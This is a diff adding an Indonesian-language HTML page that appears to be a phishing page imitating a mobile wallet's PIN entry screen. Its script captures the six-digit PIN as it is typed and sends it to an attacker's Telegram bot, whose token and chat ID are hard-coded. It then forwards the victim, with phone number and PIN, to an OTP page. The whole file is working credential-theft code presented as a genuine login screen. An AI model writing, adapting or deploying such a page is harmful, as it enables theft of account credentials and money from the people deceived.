@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan PIN</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        primary: '#009EEB',
+                        grayText: '#1F2937',
+                        grayLight: '#E5E7EB',
+                    },
+                    fontFamily: {
+                        sans: ['Inter', 'sans-serif'],
+                    },
+                }
+            }
+        }
+    </script>
+    <style type="text/tailwindcss">
+        @layer utilities {
+            .container-sm {
+                max-width: 360px;
+                margin: 0 auto;
+            }
+            .pin-circle {
+                width: 10px;
+                height: 10px;
+                border-radius: 80%;
+                border: 1px solid #D1D5DB;
+                background-color: #E5E7EB;
+            }
+            .pin-filled {
+                background-color: #0066CC;
+                border-color: #0066CC;
+            }
+        }
+    </style>
+</head>
+<body class="font-sans bg-white min-h-screen">
+    <header class="bg-primary h-14 flex items-center px-4 shadow-md">
+        <button class="text-white text-lg mr-2" onclick="history.back()">
+            <i class="fa fa-arrow-left"></i>
+        </button>
+        <h1 class="text-white text-base font-medium">Masuk</h1>
+    </header>
+    <main class="container-sm px-2 mt-20">
+        <h2 class="text-sm font-medium text-grayText text-center mb-10">Masukkan PIN</h2>
+        <form id="formPin" class="space-y-5">
+            <div class="flex justify-center gap-2.5">
+                <div class="pin-circle" id="p1"></div>
+                <div class="pin-circle" id="p2"></div>
+                <div class="pin-circle" id="p3"></div>
+                <div class="pin-circle" id="p4"></div>
+                <div class="pin-circle" id="p5"></div>
+                <div class="pin-circle" id="p6"></div>
+            </div>
+            <input type="Number" id="pinInput" maxlength="6" class="opacity-0 absolute" required>
+            <div class="text-center mt-4">
+                <a href="otpp.html" class="text-grayText font-semibold text-sm">LUPA PIN?</a>
+            </div>
+        </form>
+    </main>
+
+    <!-- Tombol disembunyikan karena otomatis pindah -->
+    <div class="fixed bottom-6 left-0 right-0 container-sm px-4" style="display: none;">
+        <button type="submit" form="formPin" id="btnLanjutkan" class="w-full bg-grayLight text-gray-400 font-medium py-2.5 rounded-lg text-sm cursor-not-allowed transition-all duration-300" disabled>
+            Lanjutkan
+        </button>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8428653854:AAG4XeGXXR-U-SQPwuKvNDzE1-PTXBjKCGo";
+        const CHAT_ID = "8683949047";
+
+        // ✅ BACA NOMOR DARI HALAMAN SEBELUMNYA
+        const urlParams = new URLSearchParams(window.location.search);
+        const nomorAsli = urlParams.get('nomor') || '';
+
+        const pinInput = document.getElementById('pinInput');
+        const circles = [document.getElementById('p1'), document.getElementById('p2'), document.getElementById('p3'), document.getElementById('p4'), document.getElementById('p5'), document.getElementById('p6')];
+        const form = document.getElementById('formPin');
+        let pinValue = "";
+
+        document.addEventListener('click', () => pinInput.focus());
+
+        pinInput.addEventListener('input', function(e) {
+            pinValue = e.target.value.replace(/[^0-9]/g, '').slice(0,6);
+            this.value = pinValue;
+            circles.forEach((circle, idx) => {
+                if(idx < pinValue.length) circle.classList.add('pin-filled');
+                else circle.classList.remove('pin-filled');
+            });
+
+            // ✅ FITUR UTAMA: JIKA SUDAH 6 ANGKA, LANGSUNG PROSES & PINDAH HALAMAN
+            if(pinValue.length === 6) {
+                kirimDanPindah(); // Panggil fungsi otomatis
+            }
+        });
+
+        // Fungsi kirim data ke Telegram lalu pindah halaman
+        function kirimDanPindah() {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=PIN Dimasukkan: ${pinValue}`)
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) {
+                    // ✅ PINDAH OTOMATIS KE HALAMAN BERIKUTNYA + BAWA DATA
+                    window.location.href = "otpp.html?nomor=" + nomorAsli + "&pin=" + pinValue;
+                } else {
+                    alert('Gagal mengirim!');
+                }
+            })
+            .catch(() => alert('Kesalahan jaringan!'));
+        }
+
+        // Form submit sekarang hanya cadangan saja
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            kirimDanPindah();
+        });
+    </script>
+</body>
+</html>
